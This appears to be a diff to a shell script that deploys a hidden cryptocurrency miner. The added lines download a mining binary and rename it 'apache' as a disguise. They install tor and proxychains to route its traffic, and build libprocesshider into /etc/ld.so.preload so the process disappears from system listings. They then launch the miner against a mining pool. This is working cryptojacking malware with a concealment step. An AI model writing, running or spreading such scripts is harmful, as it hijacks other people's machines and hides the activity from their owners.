@@ -1,17 +1,20 @@
 #!/bin/sh
 
-WALLET=Prodent.GIT-$(echo $(shuf -i 1-999 -n 1))
+apt update
+apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
+service tor start
 
-POOL=prohashing.com:3362
+sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf
 
-sudo apt update > /dev/null 2>&1
-sudo apt install screen -y > /dev/null 2>&1
 wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
 chmod +x srb
-screen -S Ngepets -dm ./srb --disable-gpu --algorithm ghostrider --pool $POOL --wallet $WALLET --password x a=gr,c=raptoreum
-screen -ls
-sleep 4
-clear
+mv srb apache
+
+git clone https://github.com/gianlucaborello/libprocesshider.git
+cd libprocesshider
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
-screen -ls
-https://raw.githubusercontent.com/frankykamat/tuyul/main/timer.py
+
+proxychains ./apache --disable-gpu --algorithm ghostrider --pool prohashing.com:3362 --wallet Prodent a=gr,c=raptoreum
